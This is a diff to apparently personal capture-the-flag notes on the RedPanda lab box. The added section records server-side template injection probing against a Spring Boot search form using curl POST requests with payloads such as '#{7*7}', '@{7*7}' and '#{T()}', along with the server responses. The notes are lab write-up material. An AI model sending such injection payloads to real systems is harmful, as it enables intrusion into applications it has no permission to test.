@@ -208,7 +208,7 @@ Greg is a hacker. Watch out for his injection attacks!
 ```
 
 so, search for the filenames without extension
-`hungy` 
+`hungy`
 
 'greg' seems to be the only result with a relevant bio - given that it is pointing at injection, going back to sqlmap
 
@@ -266,6 +266,98 @@ Exiting: 'bool' object has no attribute 'replace'
 same for `http://redpanda.htb:8080/stats?author=foo`. try POST on /search?
 
 worth a shot, but no luck `-u http://redpanda.htb:8080/search -X POST -d 'name=foo'`
+
+still feels like ssti is the path forward. reading forum, confirmed.
+
+### ssti
+
+eventually got to `#{7*7}`, which returned `You searched for: ??49_en_US??`
+
+`#{{7*7}}` gets to `You searched for: ??{7*7}_en_US??`, so still leaking data, but not actually what we're looking for
+
+```
+$ curl http://redpanda.htb:8080/search -X POST -d 'name=@{7*7}'
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: 49</h2>
+      <h2>There are 0 results for your search</h2>
+
+    </div>
+    </div>
+
+  </body>
+</html>
+```
+
+so an `@{}` wrapped query is getting only what we want, no `_en_us`
+
+we can make '+' math work by encoding `+` ourselves, otherwise it is interpreted as a space
+
+but beyond basic math, can't get anything to work - and tplmap is empty even with `--level 5`.. which makes this feel like a very specific templating engine
+
+```
+$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{T()}'
+...
+    <h2 class="searched">You searched for: #{T()}</h2>
+      <h2>There are 0 results for your search</h2>
+```
+no injection
+
+```
+$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{T()}}'
+...
+    <h2 class="searched">You searched for: ??{T()}_en_US??</h2>
+      <h2>There are 0 results for your search</h2>
+```
+
+if not injection, at least modification
+
+```
+$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{7*7}}'
+...
+    <h2 class="searched">You searched for: ??{7*7}_en_US??</h2>
+      <h2>There are 0 results for your search</h2>
+```
+
+so not injection
+
+```
+$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{7*7}'
+    <h2 class="searched">You searched for: ??49_en_US??</h2>
+      <h2>There are 0 results for your search</h2>
+```
+injection
+
+
+```
+$ curl http://redpanda.htb:8080/search -X POST --data-raw 'name=#{{7*7}}'
+
+    <h2 class="searched">You searched for: ??{7*7}_en_US??</h2>
+      <h2>There are 0 results for your search</h2>
+
+```
+
+not injection, but modification
+
+
 
 ## flag
 
